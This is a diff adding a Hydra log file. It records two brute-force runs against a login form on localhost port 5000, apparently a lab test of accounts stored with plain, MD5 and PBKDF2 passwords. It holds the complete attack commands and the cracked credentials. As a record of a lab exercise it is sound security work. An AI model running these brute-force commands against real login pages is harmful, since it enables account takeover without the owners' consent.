@@ -1,0 +1,5 @@
+# Hydra v8.6 run at 2017-10-08 20:26:54 on 127.0.0.1 http-post-form (hydra -s 5000 -t 32 -V -I -L attack/pres_users.txt -P attack/10_million_password_list_top_1000000.txt -o attack/output.txt 127.0.0.1 http-post-form /login:username=^USER^&password=^PASS^:User and password do not match.)
+# Hydra v8.6 run at 2017-10-08 20:27:04 on 127.0.0.1 http-post-form (hydra -s 5000 -t 32 -I -L attack/pres_users.txt -P attack/10_million_password_list_top_1000000.txt -o attack/output.txt 127.0.0.1 http-post-form /login:username=^USER^&password=^PASS^:User and password do not match.)
+[5000][http-post-form] host: 127.0.0.1   login: pres_plain   password: testtest1
+[5000][http-post-form] host: 127.0.0.1   login: pres_md5   password: testtest1
+[5000][http-post-form] host: 127.0.0.1   login: pres_pbkdf2   password: testtest1
